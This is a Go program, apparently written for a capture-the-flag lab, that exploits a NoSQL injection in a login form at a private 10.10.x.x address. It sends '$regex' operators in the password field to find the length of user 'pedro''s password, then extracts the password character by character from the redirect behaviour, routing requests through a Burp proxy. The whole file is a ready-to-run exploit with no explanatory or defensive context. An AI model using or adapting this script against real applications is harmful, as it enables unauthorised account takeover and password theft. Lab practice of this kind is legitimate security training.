package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strings"
)

func main() {
	chars := "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWCVBN1234567890œ&é\"'(-è_çà)=´~#{[|`\\€<>^@]}°+¨£ê%µ,;:!?./§"
	charsBank := strings.Split(chars, "")
	urlstring := "http://10.10.85.68/login.php"
	method := "POST"
	targetuser := "pedro"

	proxyUrl, _ := url.Parse("http://127.0.0.1:8080") // burp suite
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(
				proxyUrl,
			),
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	fmt.Println("Looking for password length...")
	passLength := 0
	maxLength := 50
	for i := 1; i < maxLength && passLength == 0; i++ {
		req, err := http.NewRequest(
			method,
			urlstring,
			strings.NewReader(
				fmt.Sprintf(
					"user=%s&pass[$regex]=^.{%d}$&remember=on",
					targetuser, i,
				),
			),
		)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Connection", "close")
		if err != nil {
			log.Fatalf("Failed creating request | %s ", err.Error())
		}
		resp, err := client.Do(req)
		if !strings.Contains(resp.Header.Get("Location"), "?err=1") {
			passLength = i
		}
		if err != nil {
			log.Fatalf("Failed issuing request | %s ", err.Error())
		}
	}
	if passLength != 0 {
		fmt.Printf("Found password length : %d\n", passLength)
	} else {
		log.Fatal("Unable to find password length")
	}

	fmt.Println("Looking for password...")
	testingLength := 0
	var regtest []string
	for i := 0; i < passLength; i++ {
		regtest = append(regtest, ".")
	}
	for regtest[len(regtest)-1] == "." {
		rank := 0
		foundLetter := false
		for !foundLetter {
			regtest[testingLength] = charsBank[rank]
			rank += 1
			req, err := http.NewRequest(
				method,
				urlstring,
				strings.NewReader(
					fmt.Sprintf(
						"user=%s&pass[$regex]=^%s$&remember=on",
						targetuser, strings.Join(regtest, ""),
					),
				),
			)
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("Connection", "close")
			resp, err := client.Do(req)
			if err != nil {
				fmt.Printf("failed to send request for %s | %s\n", regtest, err.Error())
			}

			if strings.Contains(resp.Header.Get("Location"), "?err=1") {
				foundLetter = false
			} else {
				fmt.Printf("%s", regtest[testingLength])
				foundLetter = true
			}
		}
		testingLength += 1
	}

	fmt.Println("\n☝️  Found password ! ")
}
